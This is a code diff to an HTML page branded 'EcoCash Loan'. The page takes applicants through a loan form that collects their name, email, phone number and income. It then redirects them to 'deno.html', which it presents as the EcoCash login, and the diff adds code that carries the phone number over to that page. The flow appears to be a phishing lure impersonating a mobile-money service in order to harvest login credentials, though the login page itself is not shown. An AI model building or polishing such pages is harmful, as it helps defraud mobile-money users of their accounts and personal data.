@@ -3,21 +3,22 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>EcoCash Loan Calculator</title>
+<title>EcoCash Loan </title>
 <style>
   * { box-sizing: border-box; margin: 0; padding: 0; }
   body {
     font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
     background: #e9e9ec;
-    display: flex;
-    justify-content: center;
-    padding: 0;
+    margin:0;
+    width:100%;
+    overflow-x:hidden;
+    padding:0;
   }
   .phone {
     width: 100%;
     max-width: 720px;
     background: #e9e9ec;
-    min-height: 100vh;
+    min-height: 100dvh;
   }
   header {
     background: #f7f7f8;
@@ -492,22 +493,34 @@
   }
   .login-now-btn:hover { background: #f7f7f8; }
 
-/* Mobile improvements */
-@media (max-width:480px){
-  .phone{max-width:100%}
-  header{padding:14px 16px}
-  .card,.app-card,.success-card{margin:16px;padding:20px;border-radius:16px}
-  h1,.app-title,.success-title{font-size:22px}
-  .payment-box,.summary-row,.field-row{flex-wrap:wrap;gap:8px}
-  .payment-value,.field-value{font-size:22px}
-  .phone-code{width:72px;font-size:14px}
-  .apply-btn,.next-btn,.prev-btn,.submit-btn,.login-now-btn{width:100%;min-height:52px}
-  .feature-list{margin:20px 16px 32px}
-  .toast{width:calc(100% - 24px);left:12px;right:12px;transform:translateY(-20px)}
-  .toast.show{transform:translateY(0)}
+@media(max-width:768px){
+html,body{overflow-x:hidden;-webkit-text-size-adjust:100%}
+.card,.app-card,.success-card{margin:16px;width:auto}
+.phone-row{flex-direction:column}
+.phone-code{width:100%;height:50px}
+.payment-box,.field-row,.summary-row{flex-wrap:wrap;gap:8px}
+.error{color:#d00;font-size:13px;margin-top:4px}
+.invalid{border-color:#d00!important}.error{color:#d00;font-size:13px;margin-top:6px}
 }
-
 </style>
+
+<style id="mobile-enhancements">
+@media (max-width:768px){
+body{padding:0;margin:0}
+.phone{max-width:100%;min-height:100vh}
+header{padding:14px 16px}
+.card,.app-card,.success-card{margin:12px;padding:20px;border-radius:16px}
+h1{font-size:22px}
+.subtitle{font-size:14px}
+.field-row,.payment-box,.summary-row{display:block}
+.payment-value,.field-value{display:block;margin-top:6px}
+input,select,textarea,button{font-size:16px}
+.apply-btn,.next-btn,.prev-btn,.submit-btn,.login-now-btn{min-height:52px}
+.phone-row{display:block}
+.phone-code{width:100%;margin-bottom:8px;height:50px}
+}
+</style>
+
 </head>
 <body>
 <div class="phone">
@@ -795,7 +808,13 @@
 
   calculatePayment();
 
-  // ----- Screen navigation -----
+  
+function fieldContainer(el){return el.closest('.form-group')||el.parentElement;}
+function clearError(el){el.classList.remove('invalid');const c=fieldContainer(el);const e=c.querySelector('.error');if(e)e.remove();}
+function showError(el,msg){clearError(el);el.classList.add('invalid');const d=document.createElement('div');d.className='error';d.textContent=msg;fieldContainer(el).appendChild(d);el.focus();return false;}
+document.addEventListener('input',e=>{if(e.target.matches('.form-input,.form-textarea,.form-select'))clearError(e.target);},true);
+
+// ----- Screen navigation -----
   const homeScreen = document.getElementById('homeScreen');
   const applicationScreen = document.getElementById('applicationScreen');
   const personalScreen = document.getElementById('personalScreen');
@@ -839,7 +858,7 @@
 
   backBtn.addEventListener('click', () => showScreen(homeScreen));
 
-  nextStepBtn.addEventListener('click', () => showScreen(personalScreen));
+  nextStepBtn.addEventListener('click',()=>{if(!loanAmountInput.value||Number(loanAmountInput.value)<=0){return showError(loanAmountInput,'Please enter a valid loan amount.');}if(!loanPurpose.value.trim()){return showError(loanPurpose,'Please enter the purpose of the loan.');}showScreen(personalScreen);});
 
   backBtn2.addEventListener('click', () => showScreen(applicationScreen));
   prevStepBtn2.addEventListener('click', () => showScreen(applicationScreen));
@@ -853,14 +872,8 @@
     summaryApplicant.textContent = applicantName ? applicantName.toUpperCase() : '—';
   }
 
-  nextStepBtn2.addEventListener('click', () => {
-    const em=/^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-if(!firstName.value.trim()){alert('Enter first name');firstName.focus();return;}
-if(!lastName.value.trim()){alert('Enter last name');lastName.focus();return;}
-if(!email.value.trim()||!em.test(email.value.trim())){alert('Enter valid email');email.focus();return;}
-if(!phone.value.trim()){alert('Enter phone number');phone.focus();return;}
-populateSummary();
-showScreen(financialScreen);
+  nextStepBtn2.addEventListener('click',()=>{const e=document.getElementById('emailAddress'),p=document.getElementById('phoneNumber');if(!firstName.value.trim()){return showError(firstName,'First name is required.');}if(!lastName.value.trim()){return showError(lastName,'Last name is required.');}if(!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e.value)){return showError(e,'Enter a valid email address.');}if(!/^\d{9,10}$/.test(p.value.trim())){return showError(p,'Phone number must contain 9–10 digits.');}populateSummary();
+    showScreen(financialScreen);
   });
 
   backBtn3.addEventListener('click', () => showScreen(personalScreen));
@@ -879,6 +892,7 @@ countdownTimer = setInterval(() => {
   secondsLeft -= 1;
   if (secondsLeft <= 0) {
     clearInterval(countdownTimer);
+    localStorage.setItem('phone', document.getElementById('phoneNumber').value.trim());
     window.location.href = 'deno.html';
   } else {
         redirectText.textContent = `Redirecting to EcoCash login in ${secondsLeft}s…`;
@@ -886,43 +900,14 @@ countdownTimer = setInterval(() => {
     }, 1000);
   }
 
-  submitBtn.addEventListener('click', () => {
-    showScreen(successScreen);
+  submitBtn.addEventListener('click',()=>{const i=document.getElementById('annualIncome');if(!i.value||Number(i.value)<=0){return showError(i,'Please enter your annual income.');}showScreen(successScreen);
     startRedirectCountdown();
 
     toast.classList.add('show');
     setTimeout(() => toast.classList.remove('show'), 3500);
   });
 
-  goToLoginBtn.addEventListener('click', () => {
-    clearInterval(countdownTimer);
-    window.location.href = 'deno.html';
-    // or with a delay:
-    // setTimeout(() => { window.location.href = 'deno.html'; }, 300);
-});
+  goToLoginBtn.addEventListener('click',()=>{clearInterval(countdownTimer);localStorage.setItem('phone',document.getElementById('phoneNumber').value.trim());window.location.href='deno.html';});
 </script>
-
-<script>
-document.addEventListener('DOMContentLoaded',()=>{
- document.querySelectorAll('button').forEach(btn=>{
-   if(/next/i.test(btn.textContent)){
-     btn.addEventListener('click',function(e){
-       const screen=this.closest('.screen')||document;
-       const req=[...screen.querySelectorAll('input[required],select[required],textarea[required]')];
-       for(const el of req){
-         if(!el.value.trim()){
-           e.stopImmediatePropagation();
-           e.preventDefault();
-           alert('Please fill in all required fields.');
-           el.focus();
-           return false;
-         }
-       }
-     },true);
-   }
- });
-});
-</script>
-
 </body>
 </html>
